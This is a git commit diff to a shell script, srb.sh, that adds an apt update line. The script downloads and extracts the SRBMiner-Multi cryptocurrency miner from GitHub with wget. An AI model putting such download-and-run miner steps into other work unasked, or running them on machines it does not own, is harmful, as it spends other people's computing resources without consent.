fe4f54c6e5973a20c7833911c7f14956852e4a99
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-29 11:09:35 -0300

    Update srb.sh

--- srb.sh
+++ srb.sh
@@ -1,4 +1,5 @@
 #!/bin/sh
+sudo apt update
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.9/SRBMiner-Multi-0-6-9-Linux.tar.xz
 tar -xf SRBMiner-Multi-0-6-9-Linux.tar.xz
 cd SRBMiner-Multi-0-6-9
